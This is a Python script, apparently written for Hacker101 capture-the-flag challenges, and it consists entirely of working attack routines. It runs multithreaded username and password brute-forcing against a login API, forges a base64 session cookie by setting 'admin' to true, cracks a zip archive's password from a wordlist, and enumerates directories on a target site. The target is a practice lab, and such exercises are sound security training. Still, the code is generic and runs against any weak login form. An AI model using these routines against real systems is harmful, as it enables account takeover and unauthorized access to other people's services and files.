import requests
from concurrent.futures import ThreadPoolExecutor  # multithreading, much faster
import zipfile
import base64

path = "./wordlists/"
un700 = "user700.txt"
un10K = "names10000.txt"
un80K = "user80000.txt"
pw200 = "pw200.txt"
pw1K = "pw1000.txt"
pw10K = "pw10000.txt"
pw12K = "pw12000.txt"
pw100K = "pw100000.txt"
pw1M = "pw1M.txt"
dir4K = "dir4600.txt"


def force_usernames():
    def try_un(name):
        r = requests.post(
            URL,
            data={
                "username": name,
                "password": "haha",
            },
        )
        if un_fail_string not in r.text:
            print(name)

    with ThreadPoolExecutor(100) as tpe:
        for idx, name in enumerate(open(path + un700).readlines()):
            if idx % 100 == 0:
                print("Trying username #", idx)
            tpe.submit(try_un, name.strip())


def force_password(un):
    def try_pw(pw):
        r = requests.post(URL, data={"username": un, "password": pw})
        if pw_fail_string not in r.text:
            print(pw)

    with ThreadPoolExecutor(100) as tpe:
        for idx, pw in enumerate(open(path + pw1K).readlines()):
            if idx % 100 == 0:
                print("Trying password #", idx)
            tpe.submit(try_pw, pw.strip())
    print("Finished password list")


def cookie_stuff():
    cookie = b"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D"
    c_pad = b"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0="
    pt = b'{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}'
    print(base64.b64encode(pt))


def zip_cracking():
    obj = zipfile.ZipFile(filename)
    for idx, pw in enumerate(open(path + pw10K).readlines()):
        if idx % 10000 == 0:
            print("Trying password #", idx)
        try:
            obj.extractall(pwd=bytes(pw.strip(), encoding="utf-8"))
            print(pw)
            return True
        except:
            continue
    print("Finished password list")


URL = "https://5ede825f3a5ea95033d1467ca348ac9c.ctf.hacker101.com/swag-shop/api/"
un_fail_string = "Invalid Username"
pw_fail_string = "Invalid Password"
filename = "my_secure_files_not_for_you.zip"
# zip_cracking()
# force_usernames()
# force_password("access")
# cookie_stuff()


def directory_finding():
    def try_path(route):
        dir = requests.get(URL + route)
        if dir.status_code != 404:
            print(dir.status_code, "/" + route)

    # with ThreadPoolExecutor(10) as tpe:
    for idx, route in enumerate(open(path + dir4K).readlines()):
        if idx % 100 == 0:
            print("Trying directory #", idx)
            # tpe.submit(try_path, route.strip())
        try_path(route.strip())


# for swag-shop - there is api/sessions, api/stock, and api/user (400)

directory_finding()
